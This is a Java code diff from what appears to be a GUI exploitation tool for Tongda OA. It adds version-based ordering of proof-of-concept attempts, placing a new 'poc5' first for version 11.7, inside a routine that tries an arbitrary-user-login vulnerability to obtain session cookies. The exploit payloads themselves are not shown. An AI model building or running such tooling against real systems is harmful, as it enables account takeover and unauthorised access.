@@ -8,12 +8,14 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.util.ArrayList;
 import java.util.regex.Pattern;
 
 public class GetCookieActionListener implements ActionListener {
     private JTextField field_url; //目标地址
     private JTextField field_cookie; //Cookie
     private TextArea textArea; //多行文本框,显示程序运行状态
+    private String version = null;
 
     public GetCookieActionListener(JTextField field_url, JTextField field_cookie, TextArea textArea) {
         this.field_url = field_url;
@@ -24,8 +26,8 @@ public class GetCookieActionListener implements ActionListener {
 
     @Override
     public void actionPerformed(ActionEvent e) {
-        String url = Other.dataCleaning(field_url.getText(), Pattern.compile("(https?://.*?)/"));
-        String version = Other.getVersion(url);
+        String url = Other.dataCleaning(field_url.getText() + "/", Pattern.compile("(https?://.*?)/"));
+        this.version = Other.getVersion(url);
         if (version != null) {
             textArea.append("\n*******\n当前通达OA版本为: " + version);
         } else {
@@ -46,8 +48,15 @@ public class GetCookieActionListener implements ActionListener {
      */
     public String getSession(String url) {
         //任意用户登录
-        String[] pocArray = {"poc1", "poc2", "poc3", "poc4"};
+        String[] pocArray = {"poc1", "poc2", "poc3", "poc4", "poc5"}; //默认poc排序
+        ArrayList<String> pocArrayList = new ArrayList<>();
         String session = null;
+
+        if (this.version.equals("11.7")) {
+            pocArray = new String[]{"poc5", "poc1", "poc2", "poc3", "poc4"};
+        }
+
+
         textArea.append("\n正在尝试利用任意用户登录漏洞获取Cookie...");
         int i = 0;
         do {
